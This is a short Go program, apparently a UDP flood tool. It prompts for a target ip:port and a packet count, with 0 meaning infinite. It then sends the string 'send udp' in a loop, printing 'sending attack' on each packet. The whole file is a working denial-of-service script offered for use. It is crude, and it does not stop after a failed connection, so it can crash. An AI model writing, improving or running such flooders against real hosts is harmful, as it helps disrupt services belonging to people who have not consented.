package main

import (
	"fmt"
	"net"
	"sync"
)

func main() {
	var wg sync.WaitGroup
	wg.Add(1)
	go func() {
		var ip string
		var count int
		fmt.Print("Type your ip:port target :")
		fmt.Scan(&ip)
		fmt.Print("Type count request (0 for infinity) :")
		fmt.Scan(&count)
		conn, err := net.Dial("udp", ip)

		if err != nil {
			fmt.Println(err)
		}
		if count == 0 {
			for {
				conn.Write([]byte("send udp"))
				fmt.Println("sending attack")
			}
		} else {
			for i := 0; i <= count; i++ {
				conn.Write([]byte("send udp"))
				fmt.Println(i, "sending attack")
			}
		}
		wg.Done()
	}()

	wg.Wait()
}
